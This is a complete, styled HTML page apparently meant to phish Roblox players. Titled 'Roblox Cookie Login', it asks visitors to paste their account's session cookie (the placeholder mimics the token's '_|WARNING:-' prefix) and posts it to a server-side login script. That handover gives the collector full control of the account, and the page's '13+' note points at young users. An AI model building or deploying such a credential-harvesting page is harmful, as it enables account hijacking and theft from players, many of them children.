<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Cookie Login</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: linear-gradient(to right, white, black);
      color: black;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }

    .container {
      background: rgba(20, 20, 20, 0.95);
      padding: 3rem;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(255, 0, 0, 0.5);
      text-align: center;
      max-width: 400px;
      width: 90%;
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 1.5rem;
      color: white;
    }

    label {
      font-size: 1rem;
      color: white;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin: 1rem 0;
      border: none;
      border-radius: 10px;
      background: #1a1a1a;
      color: white;
      font-size: 1rem;
      outline: none;
    }

    .btn {
      background: white;
      color: black;
      padding: 10px 20px;
      font-size: 1rem;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
    }

    .btn:hover {
      background: blanchedalmond;
      transform: scale(1.05);
    }

    .message {
      margin-top: 1rem;
      font-size: 1rem;
      color: white;
      min-height: 20px;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Submit Roblox Cookie</h1>

    <form action="/api/login.php" method="POST">
      <label for="cookie">Account must be 13+:</label><br>
      <input type="text" id="cookie" name="cookie" placeholder="_|WARNING:-..." required><br>
      <button type="submit" class="btn">Submit</button>
    </form>

    <div id="message" class="message"></div>
  </div>

</body>
</html>
